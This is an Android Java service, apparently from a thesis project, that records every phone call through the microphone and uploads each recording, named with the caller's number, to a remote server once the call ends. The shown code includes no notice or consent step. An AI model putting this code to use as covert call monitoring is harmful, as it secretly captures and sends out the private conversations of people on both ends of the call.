package com.jch.thesis.phoneRecorder;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;

import com.jch.thesis.HttpUtil.AsyncRequset;
import com.jch.thesis.constent.Constant;

import java.io.File;

/**
 * 注册电话监听服务。当开始打电话时录音，并在通话结束后将录音上传到服务器。
 * <p/>
 * Created by ACER on 2014/12/18.
 */
public class PhoneListenerService extends Service {

    private File recordFile = null;


    @Override
    public void onCreate() {
        super.onCreate();
        TelephonyManager manager =
                (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        //监听电话的状态
        manager.listen(new MyListener(), PhoneStateListener.LISTEN_CALL_STATE);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private final class MyListener extends PhoneStateListener {
        private String num;
        private MediaRecorder recorder;

        public void onCallStateChanged(int state, String incomingNumber) {
            switch (state) {
                case TelephonyManager.CALL_STATE_RINGING:  /* 电话进来时 */
                    num = incomingNumber;
                    break;
                case TelephonyManager.CALL_STATE_OFFHOOK: /* 接起电话时 */
                    try {
                        File file = new File(Environment.getExternalStorageDirectory(), num + "_" + System.currentTimeMillis() + ".3gp");
                        recordFile = file;
                        recorder = new MediaRecorder();
                        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);//声音采集来源(话筒)
                        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//输出的格式
                        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);//音频编码方式
                        recorder.setOutputFile(file.getAbsolutePath());//输出方向,将录音保存到本地
                        recorder.prepare();
                        recorder.start();
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    break;
                case TelephonyManager.CALL_STATE_IDLE:  /* 无任何状态时 */
                    if (recorder != null) {
                        recorder.stop();
                        recorder.release();
                        uploadeFile(recordFile);
                    }
                    break;
            }
        }
    }

    /**
     * 将录音上传到服务器。
     *
     * @param fileName
     */
    private void uploadeFile(File fileName) {

        new AsyncRequset(Constant.URL_STR, null, null, fileName).execute();

    }


}
